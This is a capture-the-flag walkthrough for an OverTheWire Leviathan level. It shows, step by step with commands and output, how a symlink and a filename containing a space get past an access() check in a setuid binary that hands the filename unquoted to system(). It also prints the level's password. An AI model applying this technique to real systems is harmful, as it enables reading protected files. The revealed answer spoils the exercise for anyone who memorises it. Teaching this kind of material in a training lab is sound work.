# Leviathan Level 2 → 3

## Goal

`leviathan2`'s binary `printfile` takes a filename as an argument. It checks you're allowed to read the file (via `access()`), then prints its contents (via `system("/bin/cat <filename>")`). The bug: `access()` is called on the *whole* filename, but `system()` passes the same filename to a shell that splits on whitespace. A filename with a space in it becomes two arguments — and if you make the first one a symlink to the password file, `cat` dutifully prints the password.

## Concepts you'll learn

- TOCTOU-style inconsistency: `access()` and `system()` see the same string differently
- Why handing user input to a shell (`system()`) without quoting is dangerous
- Using symbolic links as a redirection primitive
- Filenames with spaces (covered from the other side back in [Bandit 2 → 3](../bandit/level02.md))

## Walkthrough

### 1. Trace what the binary does

```bash
$ cd ~
$ ls -l printfile
-r-sr-x--- 1 leviathan3 leviathan2 ... printfile

$ ./printfile
*** File Printer ***
Usage: ./printfile filename

$ ./printfile /etc/hostname
labs.overthewire.org

$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

So `access()` rejects anything you can't normally read. Watch what it does with a file you *can* read:

```bash
$ ltrace ./printfile /etc/hostname
...
access("/etc/hostname", 4)       = 0
...
system("/bin/cat /etc/hostname" <no return ...>
```

Two calls on the same string. Now introduce a space.

### 2. Build the trap

Move to a writable directory:

```bash
$ mkdir /tmp/t2work
$ cd /tmp/t2work
```

Create a symlink called `passfile` pointing at the `leviathan3` password:

```bash
$ ln -s /etc/leviathan_pass/leviathan3 passfile
```

Then create a *regular* (empty) file whose name starts with `passfile`, then a space, then anything:

```bash
$ touch "passfile extra"
$ ls -la
lrwxrwxrwx 1 leviathan2 leviathan2 ... passfile -> /etc/leviathan_pass/leviathan3
-rw-r--r-- 1 leviathan2 leviathan2 ... passfile extra
```

### 3. Hand `printfile` the space-containing name

```bash
$ ~/printfile "passfile extra"
```

Walk through what happens:

- `access("passfile extra", 4)` — the file exists (you just `touch`ed it), and it's readable by you, so this **succeeds**.
- `system("/bin/cat passfile extra")` — the system call runs `/bin/sh -c "/bin/cat passfile extra"`. The shell splits on whitespace, so `cat` gets two arguments: `passfile` and `extra`.
- `cat passfile` — follows the symlink and prints the `leviathan3` password.
- `cat extra` — fails ("No such file or directory"), which doesn't matter.

Expected output:

```
Ahdiemoo1j
cat: extra: No such file or directory
```

The first line is the password.

### 4. Log in as leviathan3

```bash
$ ssh leviathan3@leviathan.labs.overthewire.org -p 2223
```

## The answer

The password for `leviathan3` is:

**`Ahdiemoo1j`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/leviathan/leviathan2.html>
